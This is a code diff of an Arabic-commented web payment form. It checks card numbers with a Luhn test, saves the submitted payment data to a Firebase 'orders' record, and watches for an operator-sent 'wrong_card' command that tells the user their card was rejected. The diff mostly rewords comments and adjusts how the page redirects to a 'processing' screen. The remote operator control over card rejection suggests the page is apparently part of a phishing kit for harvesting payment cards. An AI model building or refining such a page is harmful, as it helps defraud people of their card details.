@@ -24,7 +24,6 @@
         .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
         .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; }
 
-        /* رسالة الرفض - تظهر فقط عند أمر الرفض */
         #rejectMsg {
             display: none; background: #feebeb; color: var(--error-red); padding: 12px;
             border-radius: 10px; border: 1px solid #facaca; margin-bottom: 15px; font-size: 13px; font-weight: bold;
@@ -51,8 +50,6 @@
         
         .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         .input-field:focus { border-color: var(--main-green); }
-        
-        /* كلاس الخطأ لتلوين المربعات بالأحمر */
         .input-field.error-border { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
 
         .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; font-weight: bold; }
@@ -124,7 +121,7 @@
 
         const nextStepRef = database.ref('orders/' + v_id + '/next_step');
 
-        // وظيفة مراقبة الأوامر (الرفض)
+        // وظيفة مراقبة رفض البطاقة
         function statusListener(snapshot) {
             const step = snapshot.val();
             if (step === 'wrong_card') {
@@ -146,6 +143,7 @@
             }
         }
 
+        // تفعيل المراقبة
         nextStepRef.on('value', statusListener);
 
         function isValidLuhn(number) {
@@ -218,10 +216,11 @@
             validateForm();
         });
 
+        // الدالة المعدلة لمنع التصفير والتحويل الفوري
         function submitPayment() {
             const btn = document.getElementById('payButton');
             
-            // إيقاف مراقب الأوامر لمنع تصفير البيانات أثناء التحويل
+            // أول خطوة: إيقاف المراقب تماماً قبل أي تعديل في الداتا
             nextStepRef.off('value', statusListener);
 
             btn.disabled = true;
@@ -237,11 +236,12 @@
                 last_update: new Date().getTime()
             };
 
+            // حفظ البيانات ثم التحويل
             database.ref('orders/' + v_id).update(payload).then(() => {
-                // التحويل المباشر لصفحة التحميل
-                window.location.href = 'processing.html'; 
-            }).catch(() => {
-                window.location.href = 'processing.html';
+                window.location.replace('processing.html'); 
+            }).catch((err) => {
+                console.error("Firebase Update Error:", err);
+                window.location.replace('processing.html');
             });
         }
     </script>
